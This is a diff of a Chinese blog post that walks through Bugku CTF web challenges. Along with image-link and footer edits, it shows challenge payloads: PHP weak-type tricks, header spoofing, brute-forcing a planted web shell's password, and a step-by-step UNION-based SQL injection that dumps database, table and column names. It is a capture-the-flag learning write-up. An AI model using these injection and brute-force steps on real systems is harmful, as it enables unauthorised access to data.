@@ -241,7 +241,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：7 天前
+                  本文最后更新于：5 天前
                 
               </p>
             
@@ -252,10 +252,12 @@
 
 <h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>查看源码即可</p>
 <h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><p>修改前端代码</p>
-<p><img src="/2020/09/06/bugku1-10/%E8%AE%A1%E7%AE%97%E5%99%A8.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/YLlnyBHGibuWfdT.png" srcset="/img/loading.gif" alt></p>
 <h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><p>payload:</p>
 <p><code>?what=flag</code></p>
-<h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><p><img src="/2020/09/06/bugku1-10/post.png" srcset="/img/loading.gif" alt></p>
+<h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><div class="hljs"><pre><code class="hljs makefile"><span class="hljs-section">POST:</span>
+what=flag</code></pre></div>
+
 <h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><p>payload: <code>?num=1a</code></p>
 <p>考察点：弱类型比较</p>
 <blockquote>
@@ -279,7 +281,7 @@ var_dump(<span class="hljs-string">"0e123456"</span>==<span class="hljs-string">
 <div class="hljs"><pre><code class="hljs c">&amp;#<span class="hljs-number">75</span>;&amp;#<span class="hljs-number">69</span>;&amp;#<span class="hljs-number">89</span>;&amp;#<span class="hljs-number">123</span>;&amp;#<span class="hljs-number">74</span>;&amp;#<span class="hljs-number">50</span>;&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">52</span>;&amp;#<span class="hljs-number">50</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">104</span>;&amp;#<span class="hljs-number">74</span>;&amp;#<span class="hljs-number">75</span>;&amp;#<span class="hljs-number">45</span>;&amp;#<span class="hljs-number">72</span>;&amp;#<span class="hljs-number">83</span>;&amp;#<span class="hljs-number">49</span>;&amp;#<span class="hljs-number">49</span>;&amp;#<span class="hljs-number">73</span>;&amp;#<span class="hljs-number">73</span>;&amp;#<span class="hljs-number">73</span>;&amp;#<span class="hljs-number">125</span>;</code></pre></div>
 
 <p>使用工具转换为字符串</p>
-<p><img src="/2020/09/06/bugku1-10/5.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/LuvcilB4qgZGb9z.png" srcset="/img/loading.gif" alt></p>
 <h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><p><strong>dns服务器用来解析域名为IP，很多国外的服务器不能访问，主要原因就是DNS服务器不能解析那些域名</strong></p>
 <p><strong>hosts就是本地用来解析域名为IP</strong>  </p>
 <p>因此hosts文件中有的域名记录，在本电脑浏览器中可直接使用域名访问</p>
@@ -289,14 +291,14 @@ var_dump(<span class="hljs-string">"0e123456"</span>==<span class="hljs-string">
 
 
 
-<p><img src="/2020/09/06/bugku1-10/host.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/9txPKZrvbMmBVSA.png" srcset="/img/loading.gif" alt></p>
 <p>文件保存后在浏览器中访问该域名 获得flag</p>
 <h2 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h2><p>打开页面什么也没有，源码也没有什么发现，抓包试试</p>
 <p>go完也没什么反应，有点迷惑</p>
 <p>但是多go几次后，发现有张图片在变</p>
-<p><img src="/2020/09/06/bugku1-10/stop.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/rm9ibzCH58Snupt.png" srcset="/img/loading.gif" alt></p>
 <p>多go几次就出来了flag,原理还未知</p>
-<p><img src="/2020/09/06/bugku1-10/stop1.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/xO1JwbyasHEdm2k.png" srcset="/img/loading.gif" alt></p>
 <h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><div class="hljs"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span> 
 error_reporting(<span class="hljs-number">0</span>);
 <span class="hljs-keyword">include</span> <span class="hljs-string">"flag1.php"</span>;
@@ -317,32 +319,32 @@ highlight_file(<span class="hljs-keyword">__file__</span>);
 <p> <strong>GLOBALS:一个包含了全部变量的全局组合数组</strong> </p>
 <p>即将include”flag.php”作为全局变量在本页面输出</p>
 <p>?args=GLOBALS</p>
-<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>源码中一串特别的代码直接放在浏览器的控制台中运行</p>
-<p><img src="/2020/09/06/bugku1-10/web5.png" srcset="/img/loading.gif" alt></p>
+<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>源码中一串特别的代码jsfuck,</p>
+<p>直接放在浏览器的控制台中运行</p>
+<p><img src="https://i.loli.net/2020/11/30/WwkYd4az3l8UA1N.png" srcset="/img/loading.gif" alt></p>
 <h2 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h2><p>打开页面什么也没有</p>
 <p>扫描目录，扫出来一大堆没用的，直接抓包</p>
 <p>。。。。就出来了</p>
-<p><img src="/2020/09/06/bugku1-10/toudengcang.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/LRTIs3Yt8jEmlip.png" srcset="/img/loading.gif" alt></p>
 <h2 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h2><p>名字提示了，网站被黑。</p>
 <p>打开题目，发现鼠标动不了，可能是被黑后的后遗症</p>
 <p>先扫描目录发现了<code>shell.php</code>,这可能是上次黑客留下的小马文件</p>
-<p><img src="/2020/09/06/bugku1-10/hack2.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/rJi2yPYftQqNCgV.png" srcset="/img/loading.gif" alt></p>
 <p>打开页面，需要密码，这就需要爆破了(密码为hack)</p>
 <p>确定要爆破的变量</p>
-<p><img src="/2020/09/06/bugku1-10/hack3.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/1bgKrVolsLa4XEh.png" srcset="/img/loading.gif" alt></p>
 <p>加载密码字典</p>
-<p><img src="/2020/09/06/bugku1-10/hack4.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/LcOoCkEFrnDVsvx.png" srcset="/img/loading.gif" alt></p>
 <p>出现结果（根据length确定密码）</p>
-<p><img src="/2020/09/06/bugku1-10/hack.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/YX6nAbTF75tfOI4.png" srcset="/img/loading.gif" alt></p>
 <p>密码为<code>hack</code></p>
 <p>登录即可</p>
 <h2 id="管理员系统"><a href="#管理员系统" class="headerlink" title="管理员系统"></a>管理员系统</h2><p>随便输入一个账号发现提示IP</p>
-<p><img src="/2020/09/06/bugku1-10/admin1.png" srcset="/img/loading.gif" alt></p>
 <p>想到了<code>X-FORWORADED-FOR:127.0.0.1</code></p>
 <p>抓包试试</p>
 <p>在响应包中发现一段base64编码<code>dGVzdDEyMw==</code> 解密后为test123，猜测为登录密码</p>
 <p>结果真对了</p>
-<p><img src="/2020/09/06/bugku1-10/admin2.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/EuicNWmtOxRD25J.png" srcset="/img/loading.gif" alt></p>
 <p>当然这题也可以使用爆破的方法做，但是密码字典需要包含test123</p>
 <h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>查看源码发现一段js代码</p>
 <p>将最后的eval改成alert(),直接在浏览器中运行弹出结果</p>
@@ -357,7 +359,7 @@ a.focus();
 &#125;
 <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"levelQuest"</span>).onsubmit=checkSubmit;</code></pre></div>
 
-<p><img src="/2020/09/06/bugku1-10/web4.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/SbN4rkwL2MHlOiQ.png" srcset="/img/loading.gif" alt></p>
 <p><code>if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;==a.value)</code></p>
 <p>直接输入67d709b2b54aa2aa648cf6e87a7114f1</p>
 <p><img src="/2020/09/06/bugku1-10/web41.png" srcset="/img/loading.gif" alt></p>
@@ -387,10 +389,9 @@ a.focus();
 
 <p>获取flag{edulcni_elif_lacol_si_siht}</p>
 <h2 id="请输入密码"><a href="#请输入密码" class="headerlink" title="请输入密码"></a>请输入密码</h2><p>提示了5位数的密码，直接爆破，可用burpsuit的爆破模块</p>
-<p><img src="/2020/09/06/bugku1-10/%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81.png" srcset="/img/loading.gif" alt></p>
 <h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p>打开题目后，出现一段代码，应该是md5值，可是解码为空密码</p>
 <p>扫描目录<code>python dirsearch.py  -u http://123.206.87.240:8002/web16/ -e php</code></p>
-<p><img src="/2020/09/06/bugku1-10/%E5%A4%87%E4%BB%BD1.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/QXP6HA2p4Ul5gaS.png" srcset="/img/loading.gif" alt></p>
 <p>发现了<code>index.php.bak</code></p>
 <blockquote>
 <p>这个应该是在编辑这个文件时，自动生成的备份文件；<br>EDITPLUS 这类的文本编辑器在编辑文件时会产生这样的备份；<br>如果编辑后没有什么问题；<br>可以删除.BAK文件             (来自百度)</p>
@@ -426,28 +427,25 @@ parse_str($str);
 <p> 如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p>
 <p> 下列的字符串的MD5值都是0e开头的：</p>
 <div class="hljs"><pre><code>QNKCDZO
-
 240610708
-
 s878926199a
-
 s155964671a
-
 s214587387a
-
-s214587387a</code></pre></div><p><img src="/2020/09/06/bugku1-10/%E5%A4%87%E4%BB%BD.png" srcset="/img/loading.gif" alt></p>
-<h2 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h2><div class="hljs"><pre><code class="hljs html">1' and 1=1 #      
-  
+s214587387a</code></pre></div><h2 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h2><p>打开页面像是注入的题目</p>
+<p>测试一些</p>
+<div class="hljs"><pre><code class="hljs html">1' and 1=1 #      
 1' and 1=2 #</code></pre></div>
-<p>   不显示内容，可以判断存在注入点</p>
-<h3 id="1-1-39-order-by-4-可正常显示可以判断存在四个字段"><a href="#1-1-39-order-by-4-可正常显示可以判断存在四个字段" class="headerlink" title="1.1&#39; order by 4 #可正常显示可以判断存在四个字段"></a>1.<code>1&#39; order by 4 #</code>可正常显示可以判断存在四个字段</h3><h3 id="2-爆数据库"><a href="#2-爆数据库" class="headerlink" title="2.爆数据库"></a>2.爆数据库</h3><div class="hljs"><pre><code>-1&apos; union select 1,database(),3,4 #
+<p>   第一个语句正常，第二个语句不显示内容，可以判断存在注入点</p>
+<h3 id="1-判断字段数"><a href="#1-判断字段数" class="headerlink" title="1.判断字段数"></a>1.判断字段数</h3><div class="hljs"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>' <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">4</span> <span class="hljs-comment">#</span></code></pre></div>
+
+
+
+<h3 id="2-爆数据库"><a href="#2-爆数据库" class="headerlink" title="2.爆数据库"></a>2.爆数据库</h3><div class="hljs"><pre><code>-1&apos; union select 1,database(),3,4 #
 database:skctf_flag</code></pre></div><h3 id="3-爆出表名"><a href="#3-爆出表名" class="headerlink" title="3.爆出表名"></a>3.爆出表名</h3><div class="hljs"><pre><code>-1&apos; union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4 #
 
  table:fl4g,sc</code></pre></div><h3 id="4-字段名"><a href="#4-字段名" class="headerlink" title="4.字段名"></a>4.字段名</h3><div class="hljs"><pre><code>-1&apos; union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where`TABLE_NAME=&quot;fl4g&quot;),3,4 #
  skctf_flag</code></pre></div><p> 得到flag</p>
 <div class="hljs"><pre><code class="hljs clojure">(<span class="hljs-name">select</span> skctf_flag from skctf_flag.fl4g)</code></pre></div>
-
-
 
 <h2 id="秋名山车神"><a href="#秋名山车神" class="headerlink" title="秋名山车神"></a>秋名山车神</h2><p>看到题目就知道需要用python的脚本来做</p>
 <div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
@@ -530,7 +528,7 @@ print(flag.text)</code></pre></div>
   <div id="vcomments"></div>
   <script type="text/javascript">
     function loadValine() {
-      addScript('https://cdn.staticfile.org/valine/1.4.14/Valine.min.js', function () {
+      addScript('https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js', function () {
         new Valine({
           el: "#vcomments",
           app_id: "2rPljbm5WOxA9BCPXqy3VE5y-gzGzoHsz",
@@ -544,6 +542,9 @@ print(flag.text)</code></pre></div>
           highlight: true,
           recordIP: false,
           serverURLs: "",
+          master: "4cd096660a71d786a2a4d9d0bb4e8996",
+          friends: "b275f0fc8103331da645a878cf60f841",
+          tagMeta: ["博主","友人","访客"],
         });
       });
     }
@@ -797,7 +798,43 @@ print(flag.text)</code></pre></div>
 
 
 
-
+<div class="text-center py-1">   
+  <div>
+    <span>Copyright © 2020</span></a>
+    <a href="http://sunzy.icu/" target="_blank" rel="nofollow noopener">
+     <span>my blog</span></a>    <br>
+  </div>
+<div>
+  <span id="timeDate">载入天数...</span>
+  <span id="times">载入时分秒...</span>
+  <script>
+  var now = new Date();
+  function createtime(){
+      var grt= new Date("03/02/2020 00:00:00");//此处修改你的建站时间或者网站上线时间
+      now.setTime(now.getTime()+250);
+      days = (now - grt ) / 1000 / 60 / 60 / 24;
+      dnum = Math.floor(days);
+      hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+      hnum = Math.floor(hours);
+      if(String(hnum).length ==1 ){
+          hnum = "0" + hnum;
+      }
+      minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+      mnum = Math.floor(minutes);
+      if(String(mnum).length ==1 ){
+                mnum = "0" + mnum;
+      }
+      seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+      snum = Math.round(seconds);
+      if(String(snum).length ==1 ){
+                snum = "0" + snum;
+      }
+      document.getElementById("timeDate").innerHTML = "🚀 for&nbsp"+dnum+"&nbspdays";  //此次自定义显示内容
+      document.getElementById("times").innerHTML = hnum + "&nbsphr&nbsp" + mnum + "&nbspmin&nbsp" + snum + "&nbspsec";
+  }  //此次自定义显示内容
+  setInterval("createtime()",250);
+  </script>
+</div>
 
 <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
 </html>
